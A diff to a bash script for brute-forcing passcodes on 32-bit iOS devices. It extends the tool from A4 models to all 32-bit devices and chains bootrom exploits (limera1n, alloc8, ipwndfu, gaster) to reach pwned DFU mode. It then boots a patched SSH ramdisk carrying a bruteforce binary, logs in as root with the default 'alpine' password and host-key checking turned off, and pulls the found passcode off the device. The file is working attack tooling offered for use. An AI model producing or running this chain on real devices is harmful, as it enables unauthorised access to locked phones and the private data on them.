@@ -1,12 +1,15 @@
 #!/usr/bin/env bash
 
 # Bruteforce Tool for 32-bit iOS Devices
-# Based on Legacy-iOS-Kit by LukeZGD
 
 ssh_port=6414
 
 [[ "$BASH_VERSION" ]] || { echo "[Error] Run with bash."; exit 1; }
 bash_ver=$(/usr/bin/env bash -c 'echo ${BASH_VERSINFO[0]}')
+
+PROJECT_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
+[[ -z "$PROJECT_ROOT" ]] && PROJECT_ROOT="$(pwd)"
+export PROJECT_ROOT
 
 # ==================== UTILITY FUNCTIONS ====================
 
@@ -37,7 +40,7 @@ clean_usbmuxd() {
 
 display_help() {
     echo "
- BRUTEFORCE A4 DEVICE
+ BRUTEFORCE 32bit-DEVICE
 
 Usage: ./Bruteforce.sh [Options]
 
@@ -46,7 +49,7 @@ Options:
     --entry-device      Manual device entry
     --debug             Enable debugging
 
-Supported: iPhone 4, iPod touch 4 ,iPad 1
+Supported: All 32bit-Device
     "
 }
 
@@ -59,7 +62,7 @@ set_tool_paths() {
         platform="linux"
         platform_ver="$PRETTY_NAME"
         [[ $(uname -m) == "a"* && $(getconf LONG_BIT) == 64 ]] && platform_arch="arm64" || platform_arch="x86_64"
-        dir="../bin/linux/$platform_arch"
+        dir="$PROJECT_ROOT/bin/linux/$platform_arch"
         export LD_LIBRARY_PATH="$dir/lib"
         bspatch="$dir/bspatch"
         scp2="$dir/scp"; ssh2="$dir/ssh"
@@ -77,14 +80,15 @@ set_tool_paths() {
         platform="macos"
         platform_ver="$(sw_vers -productVersion)"
         platform_arch="$(uname -m)"
-        dir="../bin/macos"
+        dir="$PROJECT_ROOT/bin/macos"
         [[ $platform_arch == "arm64" ]] && dir+="/arm64"
         xcode-select -p &>/dev/null || error "Install Xcode CLT: xcode-select --install"
-        /usr/bin/xattr -cr ../bin/macos 2>/dev/null
+        /usr/bin/xattr -cr $PROJECT_ROOT/bin/macos 2>/dev/null
         bspatch="$(command -v bspatch)"
         scp2="/usr/bin/scp"; ssh2="/usr/bin/ssh"
         gaster="$dir/gaster"; ipwnder="$dir/ipwnder"
         irecovery="$dir/irecovery"; primepwn="$dir/primepwn"
+        a6meowing="$dir/a6meowing"
         killall -STOP AMPDevicesAgent AMPDeviceDiscoveryAgent MobileDeviceUpdater 2>/dev/null
         trap "clean" EXIT
     else
@@ -98,9 +102,22 @@ set_tool_paths() {
     curl="$(command -v curl)"
     ideviceinfo="$dir/ideviceinfo"
     jq="$dir/jq"
-    cp ../resources/ssh_config . 2>/dev/null
+    iproxy="$dir/iproxy"
+    sshpass="$dir/sshpass"
+    [[ ! -x $sshpass ]] && sshpass="$(command -v sshpass)"
+    
+    cp $PROJECT_ROOT/resources/ssh_config . 2>/dev/null
+    ssh_opts="-F ./ssh_config -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null"
     [[ $(ssh -V 2>&1 | grep -c "SSH_[89]\|SSH_1") != 0 ]] && echo "    PubkeyAcceptedAlgorithms +ssh-rsa" >> ssh_config
-    scp2+=" -F ./ssh_config"; ssh2+=" -F ./ssh_config"
+    
+    if [[ -n $sshpass ]]; then
+        ssh2="$sshpass -p alpine $ssh2 $ssh_opts"
+        scp2="$sshpass -p alpine $scp2 $ssh_opts"
+    else
+        ssh2="$ssh2 $ssh_opts"
+        scp2="$scp2 $ssh_opts"
+        warn "sshpass not found. You will need to enter the password 'alpine' manually."
+    fi
 }
 
 # ==================== DOWNLOAD FUNCTIONS ====================
@@ -155,31 +172,67 @@ device_get_info() {
     else
         log "Finding device..."
         $ideviceinfo -s >/dev/null 2>&1 && device_mode="Normal"
-        [[ -z $device_mode ]] && device_mode="$($irecovery -q 2>/dev/null | grep -w "MODE" | cut -c 7-)"
+        [[ -z $device_mode ]] && device_mode="$($irecovery -q 2>/dev/null | grep -w "MODE" | cut -c 7- | xargs)"
     fi
-    [[ -z $device_mode ]] && error "No device found! Connect your iOS device."
+    if [[ -z $device_mode ]]; then
+        local error_msg=$'* Make sure to trust this computer on the device screen.\n* Double-check if the device is detected by iTunes/Finder.\n* Try using a different USB port or cable.'
+        error "No device found! Connect your iOS device." "$error_msg"
+    fi
     
     case $device_mode in
-        "DFU" | "Recovery" | "WTF" )
+        "DFU" | "Recovery" | "WTF" | "iBSS" | "iBEC" )
             [[ -n $device_argmode ]] && device_entry || {
                 device_type=$($irecovery -q | grep "PRODUCT" | cut -c 10-)
-                device_ecid=$(printf "%d" $($irecovery -q | grep "ECID" | cut -c 7-))
+                device_ecid=$(printf "%d" $($irecovery -q | grep "ECID" | cut -c 7-)) 2>/dev/null
                 device_model=$($irecovery -q | grep "MODEL" | cut -c 8-)
             }
             device_pwnd="$($irecovery -q | grep "PWND" | cut -c 7-)"
         ;;
         "Normal" )
             [[ -n $device_argmode ]] && device_entry || {
-                device_type=$($ideviceinfo -s -k ProductType)
-                [[ -z $device_type ]] && device_type=$($ideviceinfo -k ProductType)
-                device_ecid=$($ideviceinfo -s -k UniqueChipID)
-                device_model=$($ideviceinfo -s -k HardwareModel)
-                device_vers=$($ideviceinfo -s -k ProductVersion)
-                device_udid=$($ideviceinfo -s -k UniqueDeviceID)
+                device_type=$($ideviceinfo -s -k ProductType 2>/dev/null)
+                [[ -z $device_type ]] && device_type=$($ideviceinfo -k ProductType 2>/dev/null)
+                device_ecid=$($ideviceinfo -s -k UniqueChipID 2>/dev/null)
+                device_model=$($ideviceinfo -s -k HardwareModel 2>/dev/null)
+                device_vers=$($ideviceinfo -s -k ProductVersion 2>/dev/null)
+                device_udid=$($ideviceinfo -s -k UniqueDeviceID 2>/dev/null)
+                [[ -z $device_udid ]] && device_udid=$($ideviceinfo -k UniqueDeviceID 2>/dev/null)
             }
         ;;
     esac
-    device_model="$(echo $device_model | tr '[:upper:]' '[:lower:]')"; device_model="${device_model%??}"
+    device_model="$(echo $device_model | tr '[:upper:]' '[:lower:]')"
+    device_model="${device_model%ap}"
+    
+    # Device Type Fallback Mapping
+    if [[ -z $device_type ]]; then
+        case $device_model in
+            m68  ) device_type="iPhone1,1";; n82  ) device_type="iPhone1,2";;
+            n88  ) device_type="iPhone2,1";; n90  ) device_type="iPhone3,1";;
+            n90b ) device_type="iPhone3,2";; n92  ) device_type="iPhone3,3";;
+            n94  ) device_type="iPhone4,1";; n41  ) device_type="iPhone5,1";;
+            n42  ) device_type="iPhone5,2";; n48  ) device_type="iPhone5,3";;
+            n49  ) device_type="iPhone5,4";; n51  ) device_type="iPhone6,1";;
+            n53  ) device_type="iPhone6,2";; n56  ) device_type="iPhone7,1";;
+            n61  ) device_type="iPhone7,2";; k48  ) device_type="iPad1,1";;
+            k93  ) device_type="iPad2,1";; k94  ) device_type="iPad2,2";;
+            k95  ) device_type="iPad2,3";; k93a ) device_type="iPad2,4";;
+            p105 ) device_type="iPad2,5";; p106 ) device_type="iPad2,6";;
+            p107 ) device_type="iPad2,7";; j1   ) device_type="iPad3,1";;
+            j2   ) device_type="iPad3,2";; j2a  ) device_type="iPad3,3";;
+            p101 ) device_type="iPad3,4";; p102 ) device_type="iPad3,5";;
+            p103 ) device_type="iPad3,6";; j71  ) device_type="iPad4,1";;
+            j72  ) device_type="iPad4,2";; j73  ) device_type="iPad4,3";;
+            n45  ) device_type="iPod1,1";; n72  ) device_type="iPod2,1";;
+            n18  ) device_type="iPod3,1";; n81  ) device_type="iPod4,1";;
+            n78  ) device_type="iPod5,1";;
+        esac
+    fi
+    
+    # If still empty, prompt user
+    if [[ -z $device_type ]]; then
+        warn "Could not detect device type automatically."
+        device_entry
+    fi
     device_get_name
     echo
     print "* Device: $device_name ($device_type)"
@@ -198,8 +251,8 @@ device_get_info() {
         *) error "Device not supported: $device_type";;
     esac
     all_flash="Firmware/all_flash/all_flash.${device_model}ap.production"
-    device_fw_dir="../saved/firmware/$device_type"
-    mkdir -p $device_fw_dir ../saved/$device_type
+    device_fw_dir="$PROJECT_ROOT/saved/firmware/$device_type"
+    mkdir -p $device_fw_dir $PROJECT_ROOT/saved/$device_type
 }
 
 device_entry() {
@@ -238,7 +291,12 @@ device_dfuhelper() {
 # ==================== PWNDFU / EXPLOITS ====================
 
 enter_pwndfu() {
-    [[ $device_mode == "DFU" ]] && device_pwnd="$($irecovery -q | grep "PWND" | cut -c 7-)"
+    [[ $device_mode == "DFU" || $device_mode == "iBSS" || $device_mode == "iBEC" ]] && device_pwnd="$($irecovery -q | grep "PWND" | cut -c 7-)"
+    
+    if [[ $device_mode == "iBSS" || $device_mode == "iBEC" ]]; then
+        log "Device is already in $device_mode mode."
+        return
+    fi
     
     # 1. Handle S5L8900 (2G, 3G, iPod 1, iPod 2) - "WTF" Exploit
     if [[ $device_proc == 0 || $device_proc == 1 ]]; then
@@ -253,19 +311,19 @@ enter_pwndfu() {
         # Download WTF DFU
         local wtf_name="WTF.s5l8900xall.RELEASE.dfu"
         local wtf_url="http://appldnld.apple.com/iPhone/061-7481.20100202.4orot/iPhone1,1_3.1.3_7E18_Restore.ipsw"
-        if [[ ! -s ../saved/$wtf_name ]]; then
+        if [[ ! -s $PROJECT_ROOT/saved/$wtf_name ]]; then
              log "Downloading WTF DFU..."
-            "$dir/pzb" -g "Firmware/dfu/$wtf_name" -o "../saved/$wtf_name" "$wtf_url"
+            "$dir/pzb" -g "Firmware/dfu/$wtf_name" -o "$PROJECT_ROOT/saved/$wtf_name" "$wtf_url"
         fi
         
         # Patch WTF
-        local wtf_patched="../saved/$wtf_name.patched"
-        if [[ ! -s "../resources/patch/WTF.s5l8900xall.RELEASE.patch" ]]; then
+        local wtf_patched="$PROJECT_ROOT/saved/$wtf_name.patched"
+        if [[ ! -s "$PROJECT_ROOT/resources/patch/WTF.s5l8900xall.RELEASE.patch" ]]; then
              error "Patch file not found: resources/patch/WTF.s5l8900xall.RELEASE.patch"
         fi
         
         log "Patching WTF DFU..."
-        $bspatch "../saved/$wtf_name" "$wtf_patched" "../resources/patch/WTF.s5l8900xall.RELEASE.patch"
+        $bspatch "$PROJECT_ROOT/saved/$wtf_name" "$wtf_patched" "$PROJECT_ROOT/resources/patch/WTF.s5l8900xall.RELEASE.patch"
         
         # Send Exploit
         log "Sending Pwnage 2.0 exploit..."
@@ -308,8 +366,8 @@ enter_pwndfu() {
          case $tool in
              "reipwnder" )
                  mkdir -p shellcode
-                 cp ../resources/limera1n-shellcode.bin shellcode/
-                 ../bin/macos/reipwnder -p
+                 cp $PROJECT_ROOT/resources/limera1n-shellcode.bin shellcode/
+                 $PROJECT_ROOT/bin/macos/reipwnder -p
              ;;
              "ipwnder" ) $ipwnder -p;;
          esac
@@ -332,25 +390,25 @@ enter_pwndfu() {
          fi
 
          # Download 4.3.5 iBSS for alloc8
-         local alloc8_ibss="../saved/n88ap-iBSS-4.3.5.img3"
+         local alloc8_ibss="$PROJECT_ROOT/saved/n88ap-iBSS-4.3.5.img3"
          if [[ ! -s $alloc8_ibss ]]; then
              log "Downloading alloc8 iBSS..."
              "$dir/pzb" -g "Firmware/dfu/iBSS.n88ap.RELEASE.dfu" -o "$alloc8_ibss" http://appldnld.apple.com/iPhone4/041-1965.20110721.gxUB5/iPhone2,1_4.3.5_8L1_Restore.ipsw
          fi
          
          # Setup ipwndfu
-         mkdir -p ../resources/ipwndfu
-         if [[ ! -s ../resources/ipwndfu/ipwndfu ]]; then
+         mkdir -p $PROJECT_ROOT/resources/ipwndfu
+         if [[ ! -s $PROJECT_ROOT/resources/ipwndfu/ipwndfu ]]; then
              log "Downloading ipwndfu..."
              download_from_url "https://github.com/LukeZGD/ipwndfu/archive/refs/heads/master.zip" ipwndfu.zip
-             unzip -q ipwndfu.zip -d ../resources/
-             rm -rf ../resources/ipwndfu
-             mv ../resources/ipwndfu-* ../resources/ipwndfu
+             unzip -q ipwndfu.zip -d $PROJECT_ROOT/resources/
+             rm -rf $PROJECT_ROOT/resources/ipwndfu
+             mv $PROJECT_ROOT/resources/ipwndfu-* $PROJECT_ROOT/resources/ipwndfu
          fi
-         cp "$alloc8_ibss" ../resources/ipwndfu/
+         cp "$alloc8_ibss" $PROJECT_ROOT/resources/ipwndfu/
          
          # Run alloc8
-         pushd ../resources/ipwndfu >/dev/null
+         pushd $PROJECT_ROOT/resources/ipwndfu >/dev/null
          "$python2" ipwndfu -x
          popd >/dev/null
          
@@ -363,7 +421,7 @@ enter_pwndfu() {
     # PWNDFU for A5
     if [[ $device_proc == 5 ]]; then
         if [[ -n $device_pwnd ]]; then
-            log "Already in pwned DFU: $device_pwnd"
+            log "Device in pwned DFU: $device_pwnd"
         else
             [[ $device_mode != "DFU" ]] && device_enter_mode DFU
             echo
@@ -377,42 +435,96 @@ enter_pwndfu() {
             [[ -z $device_pwnd ]] && error "Device NOT in pwned DFU mode."
             log "Found device in pwned DFU: $device_pwnd"
         fi
+        ipwndfu_send_ibss
         return
     fi
     
     # PWNDFU for A4/A6
-    [[ -n $device_pwnd ]] && { log "Already in pwned DFU: $device_pwnd"; return; }
+    if [[ -n $device_pwnd ]]; then
+        log "Device in pwned DFU: $device_pwnd"
+        [[ $device_proc == 6 ]] && ipwndfu_send_ibss
+        return
+    fi
     
     [[ $device_mode != "DFU" ]] && device_enter_mode DFU
     
-    local tool
+    local tool="gaster"
     if [[ $device_proc == 4 ]]; then
         tool="primepwn"
-        [[ $platform == "macos" && $platform_arch == "arm64" ]] && tool="reipwnder"
+        [[ $platform == "macos" ]] && tool="reipwnder"
     elif [[ $device_proc == 6 ]]; then
-        tool="ipwnder"
+        tool="ipwndfu"
         if [[ $platform == "macos" ]]; then
-            tool="ipwnder32"
-            [[ $platform_arch == "arm64" ]] && tool="ipwnder_lite"
+            tool="ipwndfu"
+            [[ $platform_arch == "arm64" ]] && [[ ! -x "$dir/ipwnder32" ]] && tool="ipwndfu"
         fi
     fi
     
-    log "Placing device in pwnDFU using $tool"
+    log "Placing device in pwnDFU using $tool..."
+    sleep 1
     case $tool in
+        "gaster" ) $gaster pwn; $gaster reset;;
+        "a6meowing" ) $dir/a6meowing;;
         "primepwn" ) $primepwn;;
         "reipwnder" )
             mkdir -p shellcode
-            cp ../resources/limera1n-shellcode.bin shellcode/
-            ../bin/macos/reipwnder -p
+            cp $PROJECT_ROOT/resources/limera1n-shellcode.bin shellcode/
+            [[ -x $dir/reipwnder ]] && $dir/reipwnder -p || $PROJECT_ROOT/bin/macos/reipwnder -p
         ;;
         "ipwnder" ) $ipwnder -p;;
-        "ipwnder32" ) "$dir/ipwnder32" -p --noibss;;
+        "ipwnder32" ) "$dir/ipwnder32" -p;;
         "ipwnder_lite" ) $ipwnder -d;;
+        "ipwndfu" )
+            local python2="$(command -v python2)"
+            [[ -z $python2 ]] && python2="/usr/bin/python"
+            [[ ! -x $python2 ]] && error "python2 not found. Required for ipwndfu."
+            
+            # Setup ipwndfu
+            mkdir -p $PROJECT_ROOT/resources/ipwndfu
+            if [[ ! -s $PROJECT_ROOT/resources/ipwndfu/ipwndfu ]]; then
+                log "Downloading ipwndfu..."
+                download_from_url "https://github.com/LukeZGD/ipwndfu/archive/refs/heads/master.zip" ipwndfu.zip
+                unzip -q ipwndfu.zip -d $PROJECT_ROOT/resources/
+                rm -rf $PROJECT_ROOT/resources/ipwndfu
+                mv $PROJECT_ROOT/resources/ipwndfu-* $PROJECT_ROOT/resources/ipwndfu
+            fi
+            
+            pushd $PROJECT_ROOT/resources/ipwndfu >/dev/null
+            $python2 ipwndfu -p
+            sleep 2
+            popd >/dev/null
+        ;;
     esac
-    sleep 1
-    device_pwnd="$($irecovery -q | grep "PWND" | cut -c 7-)"
-    [[ -z $device_pwnd ]] && error "Failed to pwn device."
+    
+    log "Waiting for device to reconnect..."
+    local check_retry=0
+    while [[ $check_retry -lt 5 ]]; do
+        sleep 2
+        local irec_out="$($irecovery -q 2>&1)"
+        device_pwnd=$(echo "$irec_out" | grep "PWND" | cut -c 7- | xargs)
+        local cur_mode=$(echo "$irec_out" | grep -w "MODE" | cut -c 7- | xargs)
+        
+        log "Pwn check $check_retry: mode=$cur_mode pwnd=$device_pwnd"
+        
+        if [[ -n $device_pwnd ]] || [[ $cur_mode == "iBSS" ]] || [[ $cur_mode == "iBEC" ]]; then
+            log "Device is now in $cur_mode mode (pwn successful)."
+            device_pwnd="${device_pwnd:-pwned}"
+            break
+        fi
+        ((check_retry++))
+    done
+
+    if [[ -z $device_pwnd ]]; then
+        local cur_mode=$(echo "$irec_out" | grep -w "MODE" | cut -c 7- | xargs)
+        if [[ $cur_mode == "iBSS" || $cur_mode == "iBEC" ]]; then
+            log "Device is now in $cur_mode mode (pwn & iBSS upload successful)."
+            device_pwnd="pwned"
+        else
+            error "Failed to pwn device (Verification failed). \nOutput: $irec_out \nPlease try putting it in pwned DFU manually using: $dir/ipwnder32 -p"
+        fi
+    fi
     log "Device in pwned DFU: $device_pwnd"
+    [[ $device_proc == 6 ]] && ipwndfu_send_ibss
 }
 
 
@@ -532,7 +644,7 @@ create_sshrd() {
     
     device_fw_key_check
     ipsw_get_url $build_id
-    ramdisk_path="../saved/$device_type/ramdisk_$build_id"
+    ramdisk_path="$PROJECT_ROOT/saved/$device_type/ramdisk_$build_id"
     mkdir -p $ramdisk_path
     
     # Download and Decrypt 
@@ -567,44 +679,62 @@ create_sshrd() {
     log "Patching RestoreRamdisk..."
     "$dir/xpwntool" RestoreRamdisk.dec Ramdisk.raw
     "$dir/hfsplus" Ramdisk.raw grow 30000000
-    "$dir/hfsplus" Ramdisk.raw untar ../resources/sshrd/sbplist.tar 2>/dev/null
+    "$dir/hfsplus" Ramdisk.raw untar $PROJECT_ROOT/resources/sshrd/sbplist.tar 2>/dev/null
     
     if [[ $device_proc == 0 || $device_proc == 1 || $device_type == "iPad1,1" ]]; then
         log "Legacy device detected (ARMv6 or iOS 5). Using Legacy SSH..."
-        if [[ -s ../resources/sshrd/ssh_old.tar ]]; then
-            "$dir/hfsplus" Ramdisk.raw untar ../resources/sshrd/ssh_old.tar
+        if [[ -s $PROJECT_ROOT/resources/sshrd/ssh_old.tar ]]; then
+            "$dir/hfsplus" Ramdisk.raw untar $PROJECT_ROOT/resources/sshrd/ssh_old.tar
         else
             warn "ssh_old.tar not found! Trying standard ssh.tar (might fail)..."
-            "$dir/hfsplus" Ramdisk.raw untar ../resources/sshrd/ssh.tar
+            "$dir/hfsplus" Ramdisk.raw untar $PROJECT_ROOT/resources/sshrd/ssh.tar
         fi
     else
-        "$dir/hfsplus" Ramdisk.raw untar ../resources/sshrd/ssh.tar
+        "$dir/hfsplus" Ramdisk.raw untar $PROJECT_ROOT/resources/sshrd/ssh.tar
     fi
     
     "$dir/hfsplus" Ramdisk.raw mv sbin/reboot sbin/reboot_bak 2>/dev/null
     
     log "Adding bruteforce tools to ramdisk..."
-    if [[ -s ../resources/bruteforce ]]; then
-        "$dir/hfsplus" Ramdisk.raw add ../resources/bruteforce usr/bin/bruteforce
+    if [[ -s $PROJECT_ROOT/resources/bruteforce ]]; then
+        "$dir/hfsplus" Ramdisk.raw add $PROJECT_ROOT/resources/bruteforce usr/bin/bruteforce
         "$dir/hfsplus" Ramdisk.raw chmod 755 usr/bin/bruteforce
     fi
-    if [[ -s ../resources/device_infos ]]; then
-        "$dir/hfsplus" Ramdisk.raw add ../resources/device_infos usr/bin/device_infos
+    if [[ -s $PROJECT_ROOT/resources/device_infos ]]; then
+        "$dir/hfsplus" Ramdisk.raw add $PROJECT_ROOT/resources/device_infos usr/bin/device_infos
         "$dir/hfsplus" Ramdisk.raw chmod 755 usr/bin/device_infos
     fi
     
     
-    if [[ -s ../resources/restored_external ]]; then
+    # Determine OS version for restored_external selection
+    local ios_major="6"
+    case $device_target_build in
+        13*) ios_major="9";;
+        12*) ios_major="8";;
+        11*) ios_major="7";;
+        10*) ios_major="6";;
+        9*) ios_major="5";;
+        8*) ios_major="4";;
+        7*) ios_major="3";;
+    esac
+
+    local res_ext="$PROJECT_ROOT/resources/restored_external"
+    if (( ios_major >= 6 )) && [[ -s $PROJECT_ROOT/resources/ios6/restored_external ]]; then
+        res_ext="$PROJECT_ROOT/resources/ios6/restored_external"
+        log "Using iOS 6+ restored_external..."
+    fi
+
+    if [[ -s $res_ext ]]; then
         "$dir/hfsplus" Ramdisk.raw rm usr/local/bin/restored_external.real 2>/dev/null
-        "$dir/hfsplus" Ramdisk.raw add ../resources/restored_external usr/local/bin/restored_external.sshrd
+        "$dir/hfsplus" Ramdisk.raw add $res_ext usr/local/bin/restored_external.sshrd
         "$dir/hfsplus" Ramdisk.raw chmod 755 usr/local/bin/restored_external.sshrd
     fi
     
-    if [[ -s ../resources/setup.sh ]]; then
+    if [[ -s $PROJECT_ROOT/resources/setup.sh ]]; then
         "$dir/hfsplus" Ramdisk.raw rm usr/local/bin/restored_external 2>/dev/null
         
         # Prepare setup.sh
-        cp ../resources/setup.sh setup.temp
+        cp $PROJECT_ROOT/resources/setup.sh setup.temp
         
         "$dir/hfsplus" Ramdisk.raw add setup.temp usr/local/bin/restored_external
         "$dir/hfsplus" Ramdisk.raw chmod 755 usr/local/bin/restored_external
@@ -631,12 +761,12 @@ create_sshrd() {
     if [[ $device_proc == 0 ]]; then
         # S5L8900 Kernel Patching
         log "S5L8900 kernel patch from legacy ios kit."
-        $bspatch Kernelcache.dec Kernelcache.patched ../resources/patch/kernelcache.release.s5l8900x.patch
+        $bspatch Kernelcache.dec Kernelcache.patched $PROJECT_ROOT/resources/patch/kernelcache.release.s5l8900x.patch
     else 
         # kernel Patch
         cp Kernelcache.dec Kernelcache.dec.bak
         "$dir/xpwntool" Kernelcache.dec Kernelcache.raw
-        if [[ -s ../resources/kernel_patch.py ]]; then
+        if [[ -s $PROJECT_ROOT/resources/kernel_patch.py ]]; then
             # Determine OS version from build ID
             local ios_major="6"
             case $device_target_build in
@@ -652,7 +782,7 @@ create_sshrd() {
             local cpu_arch="armv7"
             [[ $device_proc -le 1 ]] && cpu_arch="armv6"
 
-            python3 ../resources/kernel_patch.py Kernelcache.raw --os $ios_major --arch $cpu_arch
+            python3 $PROJECT_ROOT/resources/kernel_patch.py Kernelcache.raw --os $ios_major --arch $cpu_arch
             if [[ -s Kernelcache.patched ]]; then
                 "$dir/xpwntool" Kernelcache.patched Kernelcache.dec -t Kernelcache.dec.bak
                 log "Kernel patched successfully."
@@ -694,17 +824,17 @@ patch_ibss_for_sending() {
     case $build_id in [789]* | 10* | 11* | 12* | 13* | 14* ) hwmodel+="ap";; esac
     name="iBSS.$hwmodel.RELEASE.dfu"
     
-    mkdir -p ../saved/$device_type
-    [[ -s ../saved/$device_type/pwnediBSS_$build_id ]] && {
-        cp ../saved/$device_type/pwnediBSS_$build_id pwnediBSS
+    mkdir -p $PROJECT_ROOT/saved/$device_type
+    [[ -s $PROJECT_ROOT/saved/$device_type/pwnediBSS_$build_id ]] && {
+        cp $PROJECT_ROOT/saved/$device_type/pwnediBSS_$build_id pwnediBSS
         log "Using cached pwnediBSS."
         return
     }
     
-    [[ -s ../saved/$device_type/iBSS_$build_id.dfu ]] && cp ../saved/$device_type/iBSS_$build_id.dfu iBSS.orig || \
+    [[ -s $PROJECT_ROOT/saved/$device_type/iBSS_$build_id.dfu ]] && cp $PROJECT_ROOT/saved/$device_type/iBSS_$build_id.dfu iBSS.orig || \
         "$dir/pzb" -g "Firmware/dfu/$name" -o iBSS.orig "$ipsw_url"
     [[ ! -s iBSS.orig ]] && error "Failed to get iBSS."
-    cp iBSS.orig ../saved/$device_type/iBSS_$build_id.dfu 2>/dev/null
+    cp iBSS.orig $PROJECT_ROOT/saved/$device_type/iBSS_$build_id.dfu 2>/dev/null
     iv=$(echo $device_fw_key | $jq -j '.keys[] | select(.image == "iBSS") | .iv')
     key=$(echo $device_fw_key | $jq -j '.keys[] | select(.image == "iBSS") | .key')
     "$dir/xpwntool" iBSS.orig iBSS.dec -iv $iv -k $key -decrypt
@@ -715,13 +845,19 @@ patch_ibss_for_sending() {
         error "Failed to create pwnediBSS."
     fi
     
-    cp pwnediBSS ../saved/$device_type/pwnediBSS_$build_id
+    cp pwnediBSS $PROJECT_ROOT/saved/$device_type/pwnediBSS_$build_id
     log "pwnediBSS created."
 }
 
 ipwndfu_send_ibss() {
-    [[ ! -s pwnediBSS ]] && [[ ! -s ../saved/$device_type/pwnediBSS ]] && patch_ibss_for_sending
-    [[ -s ../saved/$device_type/pwnediBSS ]] && cp ../saved/$device_type/pwnediBSS .
+    local cur_mode="$($irecovery -q 2>/dev/null | grep -w "MODE" | cut -c 7- | xargs)"
+    if [[ $cur_mode == "iBSS" || $cur_mode == "iBEC" ]]; then
+        log "Device is already in $cur_mode mode. Skipping redundant pwnediBSS send."
+        return
+    fi
+
+    [[ ! -s pwnediBSS ]] && [[ ! -s $PROJECT_ROOT/saved/$device_type/pwnediBSS ]] && patch_ibss_for_sending
+    [[ -s $PROJECT_ROOT/saved/$device_type/pwnediBSS ]] && cp $PROJECT_ROOT/saved/$device_type/pwnediBSS .
     [[ ! -s pwnediBSS ]] && error "pwnediBSS not found."
     
     if [[ -x $primepwn ]]; then
@@ -748,13 +884,13 @@ ipwndfu_send_ibss() {
     fi
     
     # Setup ipwndfu
-    mkdir -p ../resources/ipwndfu
-    if [[ ! -s ../resources/ipwndfu/ipwndfu ]]; then
+    mkdir -p $PROJECT_ROOT/resources/ipwndfu
+    if [[ ! -s $PROJECT_ROOT/resources/ipwndfu/ipwndfu ]]; then
         log "Downloading ipwndfu..."
         download_from_url "https://github.com/LukeZGD/ipwndfu/archive/refs/heads/master.zip" ipwndfu.zip
-        unzip -q ipwndfu.zip -d ../resources/
-        rm -rf ../resources/ipwndfu
-        mv ../resources/ipwndfu-* ../resources/ipwndfu
+        unzip -q ipwndfu.zip -d $PROJECT_ROOT/resources/
+        rm -rf $PROJECT_ROOT/resources/ipwndfu
+        mv $PROJECT_ROOT/resources/ipwndfu-* $PROJECT_ROOT/resources/ipwndfu
     fi
     
     # Setup libusb symlink for macOS
@@ -765,8 +901,8 @@ ipwndfu_send_ibss() {
     fi
     
     # S5L8900 might fail with -l, just try
-    cp pwnediBSS ../resources/ipwndfu/
-    pushd ../resources/ipwndfu >/dev/null
+    cp pwnediBSS $PROJECT_ROOT/resources/ipwndfu/
+    pushd $PROJECT_ROOT/resources/ipwndfu >/dev/null
     "$python2" ipwndfu -l pwnediBSS
     local ret=$?
     popd >/dev/null
@@ -776,21 +912,12 @@ ipwndfu_send_ibss() {
 }
 
 boot_sshrd() {
-    local ramdisk_path="../saved/$device_type/ramdisk_$device_target_build"
+    local ramdisk_path="$PROJECT_ROOT/saved/$device_type/ramdisk_$device_target_build"
 
     device_enter_mode pwnDFU
     
     if [[ $device_proc == 5 || $device_proc == 6 ]]; then
-        ipwndfu_send_ibss
-        
-        log "Waiting for device to reconnect..."
-        sleep 3
-        
-        $irecovery -q >/dev/null 2>&1 || {
-            log "Waiting for DFU mode..."
-            device_find_mode DFU 10
-        }
-        
+        # pwnediBSS already sent by enter_pwndfu
         log "Sending iBEC..."
         $irecovery -f $ramdisk_path/iBEC
         $irecovery -c go
@@ -801,12 +928,84 @@ boot_sshrd() {
     fi
     
     device_find_mode Recovery
-    log "Sending ramdisk..."; $irecovery -f $ramdisk_path/Ramdisk.dmg; $irecovery -c ramdisk; sleep 2
+    log "Sending ramdisk..."; $irecovery -f $ramdisk_path/Ramdisk.dmg
+    $irecovery -c "getenv ramdisk-delay"
+    $irecovery -c ramdisk; sleep 2
     log "Sending DeviceTree..."; $irecovery -f $ramdisk_path/DeviceTree.dec; $irecovery -c devicetree
     log "Sending Kernelcache..."; $irecovery -f $ramdisk_path/Kernelcache.dec; $irecovery -c bootx
     log "Booting..."
     log "Bruteforce will auto-run on device screen."
     print "* Passcode will be shown on device when found."
+}
+
+
+# ==================== SSH FUNCTIONS ====================
+
+device_iproxy() {
+    killall iproxy 2>/dev/null
+    log "Starting iproxy..."
+    "$iproxy" $ssh_port 22 >/dev/null 2>&1 &
+    iproxy_pid=$!
+    sleep 1
+}
+
+device_ssh() {
+    device_iproxy
+    log "Connecting to SSH (root@127.0.0.1:$ssh_port)..."
+    $ssh2 -p $ssh_port root@127.0.0.1
+    kill $iproxy_pid 2>/dev/null
+}
+
+fetch_passcode() {
+    device_iproxy
+    log "Searching for passcode results..."
+    local found passcode
+    
+    # Prioritize searching in root directory / (where results typically appear)
+    found=$($ssh2 -p $ssh_port root@127.0.0.1 "grep -l \"passcode\" /* 2>/dev/null | head -n 1")
+    
+    # Fallback to general search in common locations
+    if [[ -z $found ]]; then
+        found=$($ssh2 -p $ssh_port root@127.0.0.1 "grep -l \"passcode\" /mnt2/*.plist /tmp/*.plist 2>/dev/null | head -n 1")
+    fi
+
+    # Deep search as a last resort
+    if [[ -z $found ]]; then
+        warn "Initial search found nothing. Starting deep search from /..."
+        found=$($ssh2 -p $ssh_port root@127.0.0.1 "find / -type f -not -path \"/mnt1/*\" -exec grep -l \"passcode\" {} + 2>/dev/null | head -n 1")
+    fi
+    
+    if [[ -n $found ]]; then
+        print "Found passcode result in: $found"
+        # Try to extract from XML plist structure
+        passcode=$($ssh2 -p $ssh_port root@127.0.0.1 "grep -A1 \"passcode\" \"$found\" 2>/dev/null | grep -o \">.*<\" | sed 's/[><]//g' | head -n 1")
+        
+        # If extraction failed, just show the line containing the word
+        [[ -z $passcode ]] && passcode=$($ssh2 -p $ssh_port root@127.0.0.1 "grep \"passcode\" \"$found\" | head -n 1")
+
+        echo
+        echo "======================================"
+        echo -e "      ${color_G}FOUND PASSCODE: ${color_Y}${passcode:-Unknown}${color_N}"
+        echo "======================================"
+        echo
+        
+        print "File content ($found):"
+        echo "--------------------------------------"
+        $ssh2 -p $ssh_port root@127.0.0.1 "cat \"$found\""
+        echo "--------------------------------------"
+    else
